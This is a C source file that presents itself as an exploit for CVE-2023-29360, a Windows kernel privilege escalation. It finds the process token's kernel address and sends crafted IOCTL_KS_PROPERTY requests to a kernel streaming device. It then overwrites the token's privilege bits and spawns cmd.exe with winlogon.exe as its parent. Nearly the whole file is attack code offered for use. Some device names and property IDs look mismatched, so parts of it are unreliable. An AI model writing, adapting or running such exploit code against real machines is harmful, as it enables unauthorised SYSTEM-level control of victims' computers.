#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

// KS headers
#include <ks.h>
#include <ksmedia.h>

#include "Types.h"

// KS Device Names
#ifndef KSNAME_Server
#define KSNAME_Server L"\\\\.\\KsecDD"
#endif

#define OFFSET_OF_TOKEN_PRIVILEGES 0x40

// Function prototypes
uint64_t GetTokenAddress();
BOOL FSInitializeContextRendezvous(HANDLE hDevice);
BOOL FSInitializeStream(HANDLE hDevice);
BOOL FSRegisterStream(HANDLE hDevice);
BOOL PublishTx(HANDLE hDevice, uint64_t address);
BOOL ConsumeTx(HANDLE hDevice, uint8_t** mappedAddress);
DWORD getProcessId(const wchar_t* process);
BOOL spawnShell();

// KsOpenDefaultDevice wrapper
HRESULT MyKsOpenDefaultDevice(LPCWSTR DeviceName, DWORD Access, PHANDLE DeviceHandle)
{
    HANDLE hDevice = CreateFileW(
        DeviceName,
        Access,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        return HRESULT_FROM_WIN32(GetLastError());
    }

    *DeviceHandle = hDevice;
    return S_OK;
}

// Get current process token address
uint64_t GetTokenAddress()
{
    HANDLE currentToken = NULL;
    uint64_t tokenAddress = 0;
    NTSTATUS status;
    ULONG returnLength = 0;
    PMY_SYSTEM_HANDLE_INFORMATION handleTableInfo = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &currentToken))
    {
        printf("[-] Failed to open process token: %d\n", GetLastError());
        return 0;
    }

    printf("[+] Current process token handle: %p\n", currentToken);

    _NtQuerySystemInformation NtQuerySystemInformation = 
        (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation)
    {
        printf("[-] Failed to get NtQuerySystemInformation\n");
        CloseHandle(currentToken);
        return 0;
    }

    ULONG bufferSize = 0x10000;
    
    do {
        if (handleTableInfo != NULL)
        {
            HeapFree(GetProcessHeap(), 0, handleTableInfo);
        }

        handleTableInfo = (PMY_SYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
        
        if (!handleTableInfo)
        {
            printf("[-] Failed to allocate memory\n");
            CloseHandle(currentToken);
            return 0;
        }

        status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, bufferSize, &returnLength);
        
        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            bufferSize *= 2;
        }
        
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status))
    {
        printf("[-] NtQuerySystemInformation failed: 0x%X\n", status);
        HeapFree(GetProcessHeap(), 0, handleTableInfo);
        CloseHandle(currentToken);
        return 0;
    }

    printf("[+] Number of handles: %lu\n", handleTableInfo->NumberOfHandles);

    DWORD currentPid = GetCurrentProcessId();
    USHORT tokenHandleValue = (USHORT)((ULONG_PTR)currentToken & 0xFFFF);

    for (ULONG i = 0; i < handleTableInfo->NumberOfHandles; i++)
    {
        if (handleTableInfo->Handles[i].UniqueProcessId == currentPid && 
            handleTableInfo->Handles[i].HandleValue == tokenHandleValue)
        {
            tokenAddress = (uint64_t)handleTableInfo->Handles[i].Object;
            printf("[+] Found token object at: 0x%llx\n", tokenAddress);
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, handleTableInfo);
    CloseHandle(currentToken);

    return tokenAddress;
}

BOOL FSInitializeContextRendezvous(HANDLE hDevice)
{
    DWORD bytesReturned = 0;
    KSPROPERTY prop;

    prop.Set = KSPROPSETID_StreamAllocator;
    prop.Id = KSPROPERTY_STREAMALLOCATOR_FUNCTIONTABLE;
    prop.Flags = KSPROPERTY_TYPE_GET;

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        &prop,
        sizeof(KSPROPERTY),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result)
    {
        printf("[-] FSInitializeContextRendezvous failed: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL FSInitializeStream(HANDLE hDevice)
{
    DWORD bytesReturned = 0;
    KSALLOCATOR_FRAMING framing;
    
    memset(&framing, 0, sizeof(KSALLOCATOR_FRAMING));
    framing.Frames = 1;
    framing.FrameSize = 0x1000;
    framing.FileAlignment = FILE_QUAD_ALIGNMENT;
    framing.Reserved = 0;

    KSPROPERTY prop;
    prop.Set = KSPROPSETID_StreamAllocator;
    prop.Id = KSPROPERTY_STREAMALLOCATOR_FUNCTIONTABLE;
    prop.Flags = KSPROPERTY_TYPE_SET;

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        &prop,
        sizeof(KSPROPERTY),
        &framing,
        sizeof(KSALLOCATOR_FRAMING),
        &bytesReturned,
        NULL
    );

    if (!result)
    {
        printf("[-] FSInitializeStream failed: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL FSRegisterStream(HANDLE hDevice)
{
    DWORD bytesReturned = 0;
    KSPROPERTY prop;

    prop.Set = KSPROPSETID_Connection;
    prop.Id = KSPROPERTY_CONNECTION_ALLOCATORFRAMING;
    prop.Flags = KSPROPERTY_TYPE_GET;

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        &prop,
        sizeof(KSPROPERTY),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result)
    {
        printf("[-] FSRegisterStream failed: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL PublishTx(HANDLE hDevice, uint64_t address)
{
    DWORD bytesReturned = 0;
    
    typedef struct {
        KSPROPERTY prop;
        uint64_t address;
    } INPUT_STRUCT;
    
    INPUT_STRUCT input;

    input.prop.Set = KSPROPSETID_StreamAllocator;
    input.prop.Id = KSPROPERTY_STREAMALLOCATOR_STATUS;
    input.prop.Flags = KSPROPERTY_TYPE_SET;
    input.address = address;

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        &input,
        sizeof(INPUT_STRUCT),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result)
    {
        printf("[-] PublishTx failed: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL ConsumeTx(HANDLE hDevice, uint8_t** mappedAddress)
{
    DWORD bytesReturned = 0;
    KSPROPERTY prop;
    uint64_t outputBuffer = 0;

    prop.Set = KSPROPSETID_StreamAllocator;
    prop.Id = KSPROPERTY_STREAMALLOCATOR_STATUS;
    prop.Flags = KSPROPERTY_TYPE_GET;

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        &prop,
        sizeof(KSPROPERTY),
        &outputBuffer,
        sizeof(uint64_t),
        &bytesReturned,
        NULL
    );

    if (!result)
    {
        printf("[-] ConsumeTx failed: %d\n", GetLastError());
        return FALSE;
    }

    *mappedAddress = (uint8_t*)outputBuffer;
    return TRUE;
}

DWORD getProcessId(const wchar_t* process)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    DWORD pid = 0;

    if (hSnapShot == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to create snapshot: %d\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapShot, &pe32) == FALSE)
    {
        printf("[-] Process32FirstW failed: %d\n", GetLastError());
        CloseHandle(hSnapShot);
        return 0;
    }

    do {
        if (_wcsicmp(pe32.szExeFile, process) == 0)
        {
            pid = pe32.th32ProcessID;
            wprintf(L"[+] Found process '%s' with PID: %d\n", process, pid);
            break;
        }
    } while (Process32NextW(hSnapShot, &pe32));

    CloseHandle(hSnapShot);
    return pid;
}

BOOL spawnShell()
{
    STARTUPINFOEXW siex;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize = 0;
    DWORD winlogonPid = 0;
    HANDLE hWinlogonProcess = NULL;
    
    memset(&siex, 0, sizeof(STARTUPINFOEXW));
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    printf("[+] Spawning elevated shell...\n");

    winlogonPid = getProcessId(L"winlogon.exe");
    
    if (winlogonPid == 0)
    {
        printf("[-] Failed to find winlogon.exe\n");
        return FALSE;
    }

    hWinlogonProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPid);
    
    if (!hWinlogonProcess)
    {
        printf("[-] Failed to open winlogon.exe: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Opened winlogon.exe handle: %p\n", hWinlogonProcess);

    siex.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 
        HEAP_ZERO_MEMORY, 
        attributeSize
    );

    if (!siex.lpAttributeList)
    {
        printf("[-] Failed to allocate attribute list\n");
        CloseHandle(hWinlogonProcess);
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attributeSize))
    {
        printf("[-] InitializeProcThreadAttributeList failed: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hWinlogonProcess);
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(
        siex.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hWinlogonProcess,
        sizeof(HANDLE),
        NULL,
        NULL))
    {
        printf("[-] UpdateProcThreadAttribute failed: %d\n", GetLastError());
        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hWinlogonProcess);
        return FALSE;
    }

    wchar_t cmdLine[] = L"cmd.exe";
    
    if (!CreateProcessW(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        (LPSTARTUPINFOW)&siex,
        &pi))
    {
        printf("[-] CreateProcessW failed: %d\n", GetLastError());
        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hWinlogonProcess);
        return FALSE;
    }

    printf("[+] New elevated process created successfully!\n");
    printf("[+] Process ID: %d\n", pi.dwProcessId);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hWinlogonProcess);
    DeleteProcThreadAttributeList(siex.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);

    return TRUE;
}

int main()
{
    uint64_t tokenAddress = 0;
    uint64_t privAddr = 0;
    HANDLE DeviceH1 = NULL;
    HANDLE DeviceH2 = NULL;
    HANDLE DeviceH3 = NULL;
    HRESULT hr;
    uint8_t *mappedAddress = NULL;

    printf("\n");
    printf("============================================================\n");
    printf("          CVE-2023-29360 Exploit                            \n");
    printf("          Windows Kernel Privilege Escalation              \n");
    printf("============================================================\n");
    printf("\n");

    printf("[*] Opening device handles...\n");

    hr = MyKsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH1);
    if (hr != S_OK)
    {
        printf("[-] Failed to open device handle 1: 0x%X\n", hr);
        return 1;
    }

    hr = MyKsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH2);
    if (hr != S_OK)
    {
        printf("[-] Failed to open device handle 2: 0x%X\n", hr);
        CloseHandle(DeviceH1);
        return 1;
    }

    hr = MyKsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH3);
    if (hr != S_OK)
    {
        printf("[-] Failed to open device handle 3: 0x%X\n", hr);
        CloseHandle(DeviceH1);
        CloseHandle(DeviceH2);
        return 1;
    }

    printf("[+] Device handle 1: %p\n", DeviceH1);
    printf("[+] Device handle 2: %p\n", DeviceH2);
    printf("[+] Device handle 3: %p\n", DeviceH3);
    printf("\n");

    printf("[*] Getting current process token address...\n");
    tokenAddress = GetTokenAddress();

    if (!tokenAddress)
    {
        printf("[-] Failed to get token address\n");
        goto cleanup;
    }

    privAddr = tokenAddress + OFFSET_OF_TOKEN_PRIVILEGES;

    printf("[+] Token address: 0x%llx\n", tokenAddress);
    printf("[+] Privileges address: 0x%llx\n", privAddr);
    printf("\n");

    printf("[*] Executing exploit...\n");

    if (!FSInitializeContextRendezvous(DeviceH1))
    {
        printf("[-] FSInitializeContextRendezvous failed\n");
        goto cleanup;
    }
    printf("[+] FSInitializeContextRendezvous succeeded\n");

    if (!FSInitializeStream(DeviceH2))
    {
        printf("[-] FSInitializeStream failed\n");
        goto cleanup;
    }
    printf("[+] FSInitializeStream succeeded\n");

    if (!FSRegisterStream(DeviceH3))
    {
        printf("[-] FSRegisterStream failed\n");
        goto cleanup;
    }
    printf("[+] FSRegisterStream succeeded\n");

    if (!PublishTx(DeviceH3, privAddr))
    {
        printf("[-] PublishTx failed\n");
        goto cleanup;
    }
    printf("[+] PublishTx succeeded\n");

    if (!ConsumeTx(DeviceH3, &mappedAddress))
    {
        printf("[-] ConsumeTx failed\n");
        goto cleanup;
    }
    printf("[+] ConsumeTx succeeded\n");
    printf("\n");

    if (mappedAddress != NULL)
    {
        uint64_t address = (uint64_t)mappedAddress;
        uint64_t baseAlignment = 0x1000;
        uint64_t alignedAddress = address & ~(baseAlignment - 1);

        printf("[+] Mapped address: %p\n", mappedAddress);
        printf("[+] Aligned address: 0x%llx\n", alignedAddress);
        printf("\n");

        printf("[*] Enabling all token privileges...\n");
        memset(mappedAddress, 0xFF, 0x10);
        printf("[+] All privileges enabled!\n");
        printf("\n");

        if (spawnShell())
        {
            printf("\n[+] Exploit completed successfully!\n");
        }
        else
        {
            printf("\n[-] Failed to spawn elevated shell\n");
        }
    }
    else
    {
        printf("[-] Failed to map address\n");
    }

cleanup:
    if (DeviceH1) CloseHandle(DeviceH1);
    if (DeviceH2) CloseHandle(DeviceH2);
    if (DeviceH3) CloseHandle(DeviceH3);

    printf("\n[*] Cleanup completed\n");
    return 0;
}
